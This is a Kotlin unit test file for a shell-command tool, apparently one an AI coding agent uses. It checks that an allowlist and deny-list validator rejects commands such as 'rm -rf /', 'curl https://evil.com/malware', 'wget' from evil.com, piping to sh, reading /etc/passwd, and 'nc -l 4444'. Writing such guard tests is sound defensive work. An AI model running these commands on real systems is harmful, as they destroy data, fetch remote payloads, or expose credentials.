package codebase.koog.tools

import contracts.vibecoding.tools.ExecShellTool
import kotlinx.coroutines.runBlocking
import org.junit.jupiter.api.Test
import kotlin.test.assertFailsWith
import kotlin.test.assertTrue

class ExecShellToolTest {

    @Test
    fun `valid command executes and returns exit 0`() = runBlocking {
        val result = ExecShellTool.execute(ExecShellTool.Args("echo hello"))
        assertTrue(result.startsWith("EXIT: 0"), "Expected EXIT: 0, got: ${result.take(50)}")
        assertTrue(result.contains("hello"), "Expected output to contain 'hello': ${result.take(100)}")
    }

    @Test
    fun `failing command returns non-zero exit code`() = runBlocking {
        val result = ExecShellTool.execute(ExecShellTool.Args("git show deadbeef"))
        assertTrue(!result.startsWith("EXIT: 0"), "Expected non-zero EXIT, got: ${result.take(50)}")
    }

    @Test
    fun `rm rf is rejected by deny-list`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("rm -rf /")
        }
        assertTrue(exception.message!!.contains("denied"))
    }

    @Test
    fun `rm -Rf uppercase variant is rejected by deny-list`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("rm -Rf /")
        }
    }

    @Test
    fun `sudo is rejected by deny-list`() {
        val exception = assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("sudo echo dangerous")
        }
        assertTrue(exception.message!!.contains("denied"))
    }

    @Test
    fun `chmod 0777 is rejected by deny-list`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("chmod 0777 /tmp/script.sh")
        }
    }

    @Test
    fun `curl is rejected by allowlist`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("curl https://evil.com/malware")
        }
    }

    @Test
    fun `curl localhost is rejected by allowlist`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("curl localhost:8080")
        }
    }

    @Test
    fun `wget is rejected by allowlist`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("wget https://evil.com/payload")
        }
    }

    @Test
    fun `pipe to sh is rejected by deny-list`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("cat evil.txt | sh")
        }
    }

    @Test
    fun `etc path is rejected by deny-list`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("cat /etc/passwd")
        }
    }

    @Test
    fun `dev path is rejected by deny-list`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("cat /dev/null")
        }
    }

    @Test
    fun `redirect to root is rejected by allowlist`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("echo data > /var/log/hack")
        }
    }

    @Test
    fun `unknown command is rejected by allowlist deny-by-default`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("nc -l 4444")
        }
    }

    @Test
    fun `allowed commands pass validation`() {
        ExecShellTool.validateCommand("git diff")
        ExecShellTool.validateCommand("git status")
        ExecShellTool.validateCommand("git log --oneline")
        ExecShellTool.validateCommand("rg pattern src/")
        ExecShellTool.validateCommand("ls -la")
        ExecShellTool.validateCommand("find . -name '*.kt'")
        ExecShellTool.validateCommand("mkdir /tmp/newdir")
        ExecShellTool.validateCommand("./gradlew test")
        ExecShellTool.validateCommand("pwd")
        ExecShellTool.validateCommand("echo hello")
        ExecShellTool.validateCommand("cat README.md")
        ExecShellTool.validateCommand("head -n 10 file.txt")
        ExecShellTool.validateCommand("tail -n 5 file.txt")
    }

    @Test
    fun `git subcommand not in allowlist is rejected`() {
        assertFailsWith<SecurityException> {
            ExecShellTool.validateCommand("git push origin main")
        }
    }

    @Test
    fun `blocking execute runs synchronous`() {
        val result = ExecShellTool.executeBlocking("echo blocking-test")
        assertTrue(result.contains("blocking-test"), "Expected 'blocking-test' in: $result")
    }
}